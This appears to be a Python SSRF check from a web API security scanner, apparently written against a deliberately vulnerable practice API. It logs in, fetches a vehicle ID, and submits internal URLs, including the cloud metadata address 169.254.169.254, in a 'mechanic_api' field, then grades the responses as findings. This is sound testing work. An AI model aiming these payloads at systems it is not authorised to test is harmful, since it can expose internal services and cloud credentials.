import requests

def check_ssrf(config):
    base_url = config["target"]["base_url"]
    findings = []

    login_resp = requests.post(
        base_url + config["auth"]["login_url"],
        json=config["auth"]["test_credentials"],
        timeout=5
    )

    if login_resp.status_code != 200:
        findings.append({
            "check": "SSRF",
            "severity": "ERROR",
            "endpoint": "/workshop/api/merchant/contact_mechanic",
            "method": "POST",
            "detail": "Could not obtain token"
        })
        return findings

    token = login_resp.json().get("token") or login_resp.json().get("access_token")
    headers = {"Authorization": f"Bearer {token}"}

    # Get real vehicle ID
    vehicles_resp = requests.get(
        base_url + "/identity/api/v2/vehicle/vehicles",
        headers=headers, timeout=5
    )
    vehicle_id = None
    if vehicles_resp.status_code == 200:
        try:
            vehicles = vehicles_resp.json()
            if vehicles:
                vehicle_id = vehicles[0].get("uuid")
        except Exception:
            pass

    if not vehicle_id:
        findings.append({
            "check": "SSRF",
            "severity": "ERROR",
            "endpoint": "/workshop/api/merchant/contact_mechanic",
            "method": "POST",
            "detail": "No vehicle found — add a vehicle to test account first"
        })
        return findings

    ssrf_targets = [
        "http://127.0.0.1",
        "http://169.254.169.254/latest/meta-data/",
    ]

    for target_url in ssrf_targets:
        payload = {
            "mechanic_api": target_url,
            "problem_details": "test ssrf",
            "vehicle_id": vehicle_id,
            "mechanic_code": "TRAC_JME",
            "repeat_request": False,
            "number_of_repeats": 1
        }

        resp = requests.post(
            base_url + "/workshop/api/merchant/contact_mechanic",
            json=payload,
            headers=headers,
            timeout=10
        )

        status = resp.status_code
        body = resp.text[:300]

        # "Could not connect" = server ATTEMPTED the request = SSRF confirmed
        ssrf_attempted = "could not connect to mechanic api" in body.lower()
        ssrf_indicators = ["connection refused", "<!doctype", "ec2", "ami-id",
                           "instance-id", "html", "internal"]

        if ssrf_attempted:
            findings.append({
                "check": "SSRF",
                "severity": "HIGH",
                "endpoint": "/workshop/api/merchant/contact_mechanic",
                "method": "POST",
                "detail": f"Server attempted to fetch {target_url} — SSRF confirmed (connection failed but request was made)"
            })
        elif status == 200:
            has_indicator = any(ind in body.lower() for ind in ssrf_indicators)
            findings.append({
                "check": "SSRF",
                "severity": "CRITICAL" if has_indicator else "HIGH",
                "endpoint": "/workshop/api/merchant/contact_mechanic",
                "method": "POST",
                "detail": f"Server fetched {target_url} and returned data — SSRF confirmed"
            })
        else:
            findings.append({
                "check": "SSRF",
                "severity": "PASS",
                "endpoint": "/workshop/api/merchant/contact_mechanic",
                "method": "POST",
                "detail": f"Rejected {target_url} with {status}"
            })
    return findings